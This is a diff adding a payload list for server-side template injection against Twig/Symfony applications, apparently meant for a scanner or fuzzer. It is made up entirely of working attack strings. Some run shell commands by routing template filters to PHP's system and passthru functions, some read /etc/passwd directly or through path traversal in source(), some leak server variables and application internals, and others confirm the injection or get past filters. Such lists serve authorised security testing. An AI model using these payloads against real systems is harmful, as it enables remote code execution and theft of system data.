@@ -1,0 +1,28 @@
+# Twig/Symfony SSTI — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|map('system')|join}}
+# ── Advanced — RCE ─────────────────────────────────────────────────────────
+{{'id'|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['cat /etc/passwd']|map('system')}}
+{{['id']|join|filter('passthru')}}
+{{{'id':0}|map('system')}}
+# ── Advanced — info leak ───────────────────────────────────────────────────
+{{app.request.server.all()}}
+{{app.request.server.get('PATH')}}
+{{constant('PHP_OS')}}
+{{constant('PHP_VERSION')}}
+{{app.user}}
+{{app.environment}}
+# ── Advanced — Symfony internals ───────────────────────────────────────────
+{{dump(app)}}
+{{source('../../../../etc/passwd')}}
+# ── Advanced — logic ───────────────────────────────────────────────────────
+{% if 1==1 %}SSTI_CONFIRMED{% endif %}
+{{7*'7'}}
+{{block('content')}}
+{{parent()}}
+{{_self}}
+# ── Advanced — bypass ──────────────────────────────────────────────────────
+{%- set x = 'id'|split(' ')|first -%}{{x}}
